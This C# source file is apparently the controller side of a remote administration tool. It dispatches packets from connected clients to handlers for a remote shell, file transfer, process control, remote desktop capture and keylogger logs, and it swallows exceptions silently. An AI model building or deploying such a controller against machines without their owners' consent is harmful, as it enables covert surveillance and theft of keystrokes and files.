using Common.Networking.Packets;
using Server.Networking.Handlers;
using Server.Networking.Packets.ClientServices;
using Server.Networking.Packets.FileManager;
using Server.Networking.Packets.Keylogger;
using Server.Networking.Packets.RemoteDesktop;
using Server.Networking.Packets.RemoteShell;
using Server.Networking.Packets.SystemInfo;
using Server.Networking.Packets.TaskManager;

namespace Server.Networking
{
    public class ClientHandler : IDisposable
    {
        private readonly Client _client;

        public ClientServicesHandler ClientServicesHandler { get; private set; }
        public SystemInformationHandler SystemInformationHandler { get; private set; }
        public RemoteShellHandler RemoteShellHandler { get; private set; }
        public TaskManagerHandler TaskManagerHandler { get; private set; }
        public FileManagerHandler FileManagerHandler { get; private set; }
        public KeyloggerHandler KeyloggerHandler { get; private set; }
        public RemoteDesktopHandler RemoteDesktopHandler { get; private set; }

        public ClientHandler(Client client)
        {
            _client = client;
            ClientServicesHandler = new(_client);
        }

        public void Init()
        {
            SystemInformationHandler = new(_client);
            RemoteShellHandler = new(_client);
            TaskManagerHandler = new(_client);
            RemoteDesktopHandler = new(_client);
            FileManagerHandler = new(_client);
            KeyloggerHandler = new(_client);
        }

        public async Task HandlePackets(int id, byte[] data)
        {
            try
            {
                switch (id)
                {
                    case 0x00:
                        // Error Packet
                        break;
                    case 0x01:
                        ClientServicesHandler.Handler(ResponsePacket.Deserialize<IdentifyClientPacket>(data));
                        break;
                    case 0x02:
                        ClientServicesHandler.Handler(ResponsePacket.Deserialize<StatusClientPacket>(data));
                        break;
                    case 0x03:
                        ClientServicesHandler.Handler(ResponsePacket.Deserialize<UserStatusClientPacket>(data));
                        break;
                    case 0x04:
                    case 0x05:
                    case 0x06:
                        break;
                    // System Info
                    case 0xca:
                        SystemInformationHandler.Handler(ResponsePacket.Deserialize<SystemInfoPacket>(data));
                        break;
                    // Remote Shell
                    case 0x20:
                        RemoteShellHandler.Handler(ResponsePacket.Deserialize<RemoteShellPacket>(data));
                        break;
                    // Task Manager
                    case 0x30:
                        TaskManagerHandler.Handler(ResponsePacket.Deserialize<GetProcessesPacket>(data));
                        break;
                    case 0x31:
                        TaskManagerHandler.Handler(ResponsePacket.Deserialize<ProcessActionPacket>(data));
                        break;
                    // File Manager
                    case 0x40:
                        FileManagerHandler.Handler(ResponsePacket.Deserialize<StatusFileManager>(data));
                        break;
                    case 0x41:
                        FileManagerHandler.Handler(ResponsePacket.Deserialize<GetDrivesPacket>(data));
                        break;
                    case 0x42:
                        FileManagerHandler.Handler(ResponsePacket.Deserialize<GetDirectoryPacket>(data));
                        break;
                    case 0x43:
                    case 0x44:
                    case 0x45:
                        break;
                    case 0x46:
                        FileManagerHandler.Handler(ResponsePacket.Deserialize<FileTransferCompletePacket>(data));
                        break;
                    case 0x47:
                        FileManagerHandler.Handler(ResponsePacket.Deserialize<FileTransferCancelPacket>(data));
                        break;
                    case 0x48:
                        FileManagerHandler.Handler(ResponsePacket.Deserialize<FileTransferChunkPacket>(data));
                        break;
                    // Message Box
                    case 0x50:
                        break;
                    // Keylogger
                    case 0x60:
                        KeyloggerHandler.Handler(ResponsePacket.Deserialize<GetKeyloggerLogsDirectory>(data));
                        break;
                    // Remote Desktop
                    case 0x70:
                        RemoteDesktopHandler.Handler(ResponsePacket.Deserialize<GetDesktopPacket>(data));
                        break;
                    case 0x71:
                        RemoteDesktopHandler.Handler(ResponsePacket.Deserialize<GetMonitorsPacket>(data));
                        break;
                    default:
                        break;
                }
            }
            catch (Exception)
            {

            }
        }

        public void Dispose()
        {
            ClientServicesHandler?.Dispose();
            SystemInformationHandler?.Dispose();
            RemoteShellHandler?.Dispose();
            TaskManagerHandler?.Dispose();
            FileManagerHandler?.Dispose();
            KeyloggerHandler?.Dispose();
            RemoteDesktopHandler?.Dispose();

            GC.SuppressFinalize(this);
        }
    }
}
